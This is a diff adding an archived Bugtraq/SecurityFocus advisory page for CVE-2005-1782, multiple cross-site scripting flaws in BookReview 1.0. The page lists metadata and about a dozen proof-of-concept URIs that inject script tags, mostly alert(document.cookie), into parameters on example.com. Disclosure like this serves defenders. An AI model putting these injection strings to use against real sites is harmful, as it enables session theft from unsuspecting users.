@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid13783<p><b><span style="font-size: 18pt;">BookReview Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13783/info">info</a><br><a href="http://www.securityfocus.com/bid/13783/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13783/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13783/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13783/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13783
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1782<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 26 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 02:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lostmon &lt;lostmon@gmail.com&gt; is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					BookReview BookReview 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URI are available:<br/>http://www.example.com/add_review.htm?isbn=0801052319&amp;amp;node=%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;amp;review=true<br/>http://www.example.com/add_review.htm?isbn=0801052319%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;amp;node=Political_Science&amp;amp;review=true<br/>http://www.example.com/add_review.htm?isbn=0553278223&amp;amp;node="&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;amp;review=true<br/>http://www.example.com/add_review.htm?node=index&amp;amp;isbn=\\"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br/>http://www.example.com/index.php?page=add_contents&amp;amp;isbn=083081423X%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;amp;chapters=25<br/>http://www.example.com/index.php?page=add_contents&amp;amp;isbn=083081423X&amp;amp;chapters=25%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/add_contents.htm?isbn=083081423X%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/suggest_category.htm?node=Agriculture%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/contact.htm?user=admin%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/add_booklist.htm?node=Agriculture_and_Aquaculture%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/add_url.htm?node=%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/>http://www.example.com/search.htm?page=search&amp;amp;submit%5Bstring%5D=%5C%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;amp;submit=Ok&amp;amp;submit%5Btype%5D=author<br/>http://www.example.com/add_classification.htm?isbn=0830815961%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;amp;node=Gospels<br/>http://www.example.com/suggest_review.htm?node=Business_and_Economics"&amp;gt;&amp;lt;SCRIPT&amp;gt;alert()&amp;lt;/SCRIPT&amp;gt;
+	
+		<ul>
+</ul>
+</div>
